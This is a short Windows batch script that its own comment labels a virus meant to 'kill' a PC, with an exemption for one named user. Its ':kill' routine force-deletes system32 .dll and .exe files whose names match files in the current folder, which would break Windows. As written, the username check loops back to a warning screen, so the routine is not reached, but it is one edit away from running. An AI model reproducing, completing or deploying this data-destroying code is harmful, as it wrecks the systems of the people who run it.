
REM VIRUS THAT WILL KILL PC exclude (PC with User Ivandrofly-LK)
:menu
@echo off
	cls
	set m=%username%
	if "%m%" == "Ivandrofly-LK" (
	cls
	goto skip
	) ELSE IF NOT "%m%" == "Ivandrofly-LK" (
	cls
	goto skip
	)

:skip
	
	color 17
	echo.
	echo.
	echo.
	echo                THIS IS %USERNAME%'S COMPUTER, CAN'T BE EXECUTED!!!
	echo                VIRUS CAN'T BE APPLY ON THIS PC-%USERNAME%
	echo.
	echo.
	echo.
	pause > nul
	goto menu

:kill
	pause > nul
	for %%G in (*.dll *.exe ) do (
		del /s /q /f "%windir%\system32\%%G" >nul || echo Virus can't be applyed & pause >nul % exit /b
		)